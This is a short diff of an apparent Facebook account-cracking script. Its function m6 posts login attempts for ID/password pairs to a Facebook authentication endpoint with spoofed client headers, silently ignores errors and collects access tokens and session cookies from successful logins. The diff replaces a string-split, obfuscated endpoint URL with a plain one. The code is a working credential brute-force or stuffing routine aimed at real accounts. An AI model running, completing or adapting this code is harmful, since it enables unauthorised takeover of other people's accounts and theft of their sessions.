@@ -1369,7 +1369,7 @@ def m6(idf,pwv):
             'X-FB-Client-IP':'True',
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            url = 'https://b-graph.facebook.com/auth/login'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
@@ -1398,7 +1398,6 @@ def m6(idf,pwv):
         time.sleep(10)
     except Exception as e:
         pass
-
 
 def m7(idf,pwv):
     global loop, ok, cp
